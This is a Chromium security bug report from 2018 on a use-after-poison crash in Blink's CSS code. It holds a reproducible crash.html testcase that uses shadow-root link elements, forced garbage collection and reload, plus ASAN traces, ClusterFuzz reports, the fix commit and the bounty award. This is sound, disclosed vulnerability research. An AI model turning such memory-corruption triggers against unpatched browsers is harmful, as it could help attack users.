# Security: use-after-poison in MarkSheetListDirty

| Field | Value |
|-------|-------|
| **Issue ID** | [40092500](https://issues.chromium.org/issues/40092500) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>CSS |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | an...@chromium.org |
| **Created** | 2018-09-19 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of chrome when loaded from a HTTP server. I was using the following flags: --no-sandbox --js-flags=--expose-gc .

It is fairly unreliable and results in 2 out of 3 attempts in a null pointer crash. It helps to load the testcase in multiple tabs (e.g. by supplying multiple URLs on the command line).

**VERSION**  

Chrome Version: asan-linux-release-591979  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

crash.html:

<script>
function start() {
location.href;
var links=[];
for(var x=0; x<20; x++) {
links[x]=document.createElementNS('http://www.w3.org/1999/xhtml','link');
links[x].setAttribute('href','empty.css?'+x);
}
o19=document.createElementNS('http://www.w3.org/1999/xhtml','META');
o707=window.document;
o1261=o707.createElementNS('http://www.w3.org/1999/xhtml','table');
o1533=o1261.createShadowRoot();
window.top.document.body.appendChild(o1261);
for(var x=0; x<20; x++) o1533.appendChild(links[x]);
o2145=o707.createElementNS('http://www.w3.org/1999/xhtml','iframe');
window.top.document.body.appendChild(o2145);
o2435=document.createElementNS('http://www.w3.org/1999/xhtml','marquee');
for(var x=0; x<20; x++) links[x].setAttribute('rel','stylesheet');
o2493=document.createElementNS('http://www.w3.org/1999/xhtml','details');
o2494=document.createElementNS('http://www.w3.org/1999/xhtml','summary');
o2493.appendChild(o2494);
o2494.appendChild(o2435);
document.documentElement.appendChild(o2493);
gc();gc();gc();gc();
location.reload();
}
</script>
<body onload="start()"></body>

empty.css is just an empty file

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

=================================================================  

==19818==ERROR: AddressSanitizer: use-after-poison on address 0x7ef01a2e4328 at pc 0x0000122ae8dc bp 0x7ffdc11e06b0 sp 0x7ffdc11e06a8  

WRITE of size 1 at 0x7ef01a2e4328 thread T0 (content\_shell)  

#0 0x122ae8db in MarkSheetListDirty ./../../third\_party/blink/renderer/core/css/style\_sheet\_collection.h:67:49  

#1 0x122ae8db in blink::StyleEngine::MarkTreeScopeDirty(blink::TreeScope&) ./../../third\_party/blink/renderer/core/css/style\_engine.cc:651:0  

#2 0x1342e32f in RemovePendingSheet ./../../third\_party/blink/renderer/core/html/link\_style.cc:196:36  

#3 0x1342e32f in blink::LinkStyle::SheetLoaded() ./../../third\_party/blink/renderer/core/html/link\_style.cc:142:0  

#4 0x11c5eea7 in blink::CSSStyleSheet::SheetLoaded() ./../../third\_party/blink/renderer/core/css/css\_style\_sheet.cc:501:33  

#5 0x12364963 in blink::StyleSheetContents::CheckLoaded() ./../../third\_party/blink/renderer/core/css/style\_sheet\_contents.cc:441:31  

#6 0x1342cf53 in blink::LinkStyle::NotifyFinished(blink::Resource\*) ./../../third\_party/blink/renderer/core/html/link\_style.cc:131:16  

#7 0x86989c8 in blink::Resource::NotifyFinished() ./../../third\_party/blink/renderer/platform/loader/fetch/resource.cc:276:8  

#8 0x143d6697 in blink::CSSStyleSheetResource::NotifyFinished() ./../../third\_party/blink/renderer/core/loader/resource/css\_style\_sheet\_resource.cc:133:13  

#9 0x86d6260 in blink::ResourceFetcher::HandleLoaderFinish(blink::Resource\*, base::TimeTicks, blink::ResourceFetcher::LoaderFinishType, unsigned int, bool) ./../../third\_party/blink/renderer/platform/loader/fetch/resource\_fetcher.cc:1639:15  

#10 0x8719d30 in blink::ResourceLoader::DidFinishLoading(base::TimeTicks, long, long, long, bool) ./../../third\_party/blink/renderer/platform/loader/fetch/resource\_loader.cc:915:13  

#11 0x174249fb in content::WebURLLoaderImpl::Context::OnCompletedRequest(network::URLLoaderCompletionStatus const&) ./../../content/renderer/loader/web\_url\_loader\_impl.cc:969:16  

#12 0x17430996 in content::ResourceDispatcher::OnRequestComplete(int, network::URLLoaderCompletionStatus const&) ./../../content/renderer/loader/resource\_dispatcher.cc:545:9  

#13 0x174448eb in content::URLLoaderClientImpl::OnComplete(network::URLLoaderCompletionStatus const&) ./../../content/renderer/loader/url\_loader\_client\_impl.cc:325:29  

#14 0x3b5af13 in network::mojom::URLLoaderClientStubDispatch::Accept(network::mojom::URLLoaderClient\*, mojo::Message\*) ./gen/services/network/public/mojom/url\_loader.mojom.cc:2168:13  

#15 0xb5a2bce in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message\*) ./../../mojo/public/cpp/bindings/lib/interface\_endpoint\_client.cc:423:32  

#16 0xb5b767a in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper\*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner\*) ./../../mojo/public/cpp/bindings/lib/multiplex\_router.cc:869:42  

#17 0xb5b55c1 in mojo::internal::MultiplexRouter::Accept(mojo::Message\*) ./../../mojo/public/cpp/bindings/lib/multiplex\_router.cc:590:38  

#18 0xb59bb1f in mojo::Connector::ReadSingleMessage(unsigned int\*) ./../../mojo/public/cpp/bindings/lib/connector.cc:476:51  

#19 0xb59d75f in mojo::Connector::ReadAllAvailableMessages() ./../../mojo/public/cpp/bindings/lib/connector.cc:505:10  

#20 0xb584514 in Run ./../../base/callback.h:129:12  

#21 0xb584514 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) ./../../mojo/public/cpp/system/simple\_watcher.cc:273:0  

#22 0xb30e7ec in Run ./../../base/callback.h:99:12  

#23 0xb30e7ec in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) ./../../base/debug/task\_annotator.cc:101:0  

#24 0xb40547c in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) ./../../base/task/sequence\_manager/thread\_controller\_impl.cc:196:23  

#25 0xb30e7ec in Run ./../../base/callback.h:99:12  

#26 0xb30e7ec in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) ./../../base/debug/task\_annotator.cc:101:0  

#27 0xb30aa7e in base::MessageLoop::RunTask(base::PendingTask\*) ./../../base/message\_loop/message\_loop.cc:434:46  

#28 0xb30b8ec in DeferOrRunPendingTask ./../../base/message\_loop/message\_loop.cc:445:5  

#29 0xb30b8ec in base::MessageLoop::DoWork() ./../../base/message\_loop/message\_loop.cc:517:0  

#30 0xb3159af in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ./../../base/message\_loop/message\_pump\_default.cc:37:31  

#31 0xb3822ab in base::RunLoop::Run() ./../../base/run\_loop.cc:102:14  

#32 0x186a4803 in content::RendererMain(content::MainFunctionParams const&) ./../../content/renderer/renderer\_main.cc:202:16  

#33 0x8be0793 in content::RunZygote(content::ContentMainDelegate\*) ./../../content/app/content\_main\_runner\_impl.cc:496:14  

#34 0x8be4339 in content::ContentMainRunnerImpl::Run(bool) ./../../content/app/content\_main\_runner\_impl.cc:899:10  

#35 0x106eeec5 in service\_manager::Main(service\_manager::MainParams const&) ./../../services/service\_manager/embedder/main.cc:472:29  

#36 0x6209a4e in content::ContentMain(content::ContentMainParams const&) ./../../content/app/content\_main.cc:19:10  

#37 0x3779407 in main ./../../content/shell/app/shell\_main.cc:39:10  

#38 0x7f7a29b16b96 in \_\_libc\_start\_main ??:0:0

Address 0x7ef01a2e4328 is a wild pointer.  

SUMMARY: AddressSanitizer: use-after-poison (/fuzzer3/dl/asan-linux-release-591979/content\_shell+0x122ae8db)  

Shadow bytes around the buggy address:  

0x0fde83454810: f7 00 00 f7 00 00 f7 00 00 f7 00 00 f7 00 00 f7  

0x0fde83454820: 00 00 f7 00 00 f7 00 00 f7 00 00 f7 00 00 f7 00  

0x0fde83454830: 00 f7 00 00 f7 00 00 f7 00 00 f7 00 00 f7 00 00  

0x0fde83454840: f7 00 00 f7 00 00 00 f7 00 00 00 f7 00 00 00 f7  

0x0fde83454850: 00 00 00 f7 00 00 00 f7 00 00 00 f7 00 00 00 f7  

=>0x0fde83454860: 00 00 00 f7 f7[f7]f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fde83454870: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fde83454880: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fde83454890: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fde834548a0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fde834548b0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==19818==ABORTING

## Timeline

### cl...@chromium.org (2018-09-19)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5242373876219904.

### cl...@chromium.org (2018-09-19)

Detailed report: <https://clusterfuzz.com/testcase?key=5242373876219904>

Job Type: linux\_asan\_chrome\_mp  

Platform Id: linux

Crash Type: Null-dereference READ  

Crash Address: 0x000000000050  

Crash State:  

blink::ShadowTreeStyleSheetCollection::CollectStyleSheets  

blink::ShadowTreeStyleSheetCollection::UpdateActiveStyleSheets  

blink::StyleEngine::UpdateActiveStyleSheetsInShadow

Sanitizer: address (ASAN)

Reproducer Testcase: <https://clusterfuzz.com/download?testcase_id=5242373876219904>

See <https://github.com/google/clusterfuzz-tools> for more information.

**Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days we've been seeing this crash frequently. If you are unable to reproduce this, please try a speculative fix based on the crash stacktrace in the report. The fix can be verified by looking at the crash statistics in the report, a day after the fix is deployed. We will auto-close the bug if the crash is not seen for 14 days.**

### cl...@chromium.org (2018-09-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5700699567161344.

### cl...@chromium.org (2018-09-20)

Detailed report: https://clusterfuzz.com/testcase?key=5700699567161344

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Null-dereference READ
Crash Address: 0x000000000008
Crash State:
  blink::StyleEngine::MarkTreeScopeDirty
  blink::LinkStyle::SheetLoaded
  blink::CSSStyleSheet::SheetLoaded
  
Sanitizer: address (ASAN)

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5700699567161344

See https://github.com/google/clusterfuzz-tools for more information.

### mb...@chromium.org (2018-09-21)

I haven't been able to repro the use-after-poison, but assigning labels assuming that case.

andruud: I noticed you fixed a similar-looking but recently. Are you a good owner for this or happen to know anyone who might be? Feel free to assign it back to me for re-triage if not.

[Monorail components: Blink>CSS]

### sh...@chromium.org (2018-09-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-09-22)

[Empty comment from Monorail migration]

### an...@chromium.org (2018-09-24)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-09-25)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2f8e481c12c9e8de107b73508b6c283569d4df5b

commit 2f8e481c12c9e8de107b73508b6c283569d4df5b
Author: Anders Hartvoll Ruud <andruud@chromium.org>
Date: Tue Sep 25 13:01:45 2018

Avoid crash when setting rel=stylesheet on <link> in shadow root.

Link elements in shadow roots without rel=stylesheet are currently not
added as stylesheet candidates upon insertion. This causes a crash if
rel=stylesheet is set (and then loaded) later.

R=futhark@chromium.org

Bug: 886753
Change-Id: Ia0de2c1edf43407950f973982ee1c262a909d220
Reviewed-on: https://chromium-review.googlesource.com/1242463
Commit-Queue: Anders Ruud <andruud@chromium.org>
Reviewed-by: Rune Lillesveen <futhark@chromium.org>
Cr-Commit-Position: refs/heads/master@{#593907}
[add] https://crrev.com/2f8e481c12c9e8de107b73508b6c283569d4df5b/third_party/WebKit/LayoutTests/fast/dom/shadow/link-without-rel-crash.html
[modify] https://crrev.com/2f8e481c12c9e8de107b73508b6c283569d4df5b/third_party/blink/renderer/core/html/html_link_element.cc


### cl...@chromium.org (2018-09-26)

ClusterFuzz has detected this issue as fixed in range 593906:593909.

Detailed report: https://clusterfuzz.com/testcase?key=5700699567161344

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Null-dereference READ
Crash Address: 0x000000000008
Crash State:
  blink::StyleEngine::MarkTreeScopeDirty
  blink::LinkStyle::SheetLoaded
  blink::CSSStyleSheet::SheetLoaded
  
Sanitizer: address (ASAN)

Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=593906:593909

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5700699567161344

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2018-09-26)

ClusterFuzz testcase 5700699567161344 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2018-09-26)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-10-01)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-10-04)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-10-04)

Nice one, $3,000 for this report!

### aw...@chromium.org (2018-10-04)

[Empty comment from Monorail migration]

### aw...@google.com (2018-10-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-26)

This bug requires manual review: M71 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2018-10-26)

(Already in 71)

### aw...@google.com (2018-12-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/886753?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092500)*
